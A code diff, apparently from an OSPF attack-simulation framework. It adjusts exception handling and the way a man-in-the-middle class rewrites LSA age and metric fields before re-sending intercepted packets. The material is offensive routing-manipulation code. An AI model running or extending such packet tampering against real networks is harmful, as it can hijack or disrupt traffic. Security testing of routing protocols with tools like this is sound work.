@@ -56,6 +56,8 @@ class MITMAttack(BaseAttack):
                     self._modified += 1
 
                 self._sender.send_raw(pkt)
+            except ValueError:
+                pass
             except Exception:
                 pass
 
@@ -72,11 +74,12 @@ class MITMAttack(BaseAttack):
                         pkt["OSPF_LSA_Hdr"].age = int(value)
                     elif add is not None:
                         pkt["OSPF_LSA_Hdr"].age += int(add)
-                elif field == "lsa.metric" and pkt.haslayer("OSPF_LSA_Hdr"):
-                    if value is not None:
-                        if hasattr(pkt["OSPF_LSA_Hdr"], "metric"):
-                            pkt["OSPF_LSA_Hdr"].metric = int(value)
-            except Exception:
+                elif field == "lsa.metric":
+                    # metric is in LSA body, not header; try type-specific layers
+                    if pkt.haslayer("OSPFLS"):
+                        if value is not None:
+                            pkt["OSPFLS"].metric = int(value)
+            except (ValueError, KeyError, AttributeError):
                 pass
         return pkt
 
